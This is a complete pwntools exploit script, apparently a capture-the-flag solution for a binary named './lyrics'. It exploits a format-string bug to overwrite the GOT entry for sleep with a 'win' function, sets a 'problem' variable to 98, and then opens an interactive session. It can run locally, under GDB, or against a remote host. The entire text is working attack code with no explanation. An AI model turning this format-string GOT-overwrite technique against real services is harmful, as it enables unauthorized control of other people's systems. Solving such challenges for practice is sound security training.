from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000401594
continue
'''.format(**locals())

exe = './lyrics'
elf = context.binary = ELF(exe, checksec=False)
p = start()

sleep_write = fmtstr_payload(6, {elf.got.sleep: elf.sym[b'win']})
p.sendlineafter(b">>> ", sleep_write); p.recvline()

prob_write = fmtstr_payload(6, {elf.sym[b"problem"]: 98})
p.sendlineafter(b">>> ", prob_write); p.recvline()

p.interactive()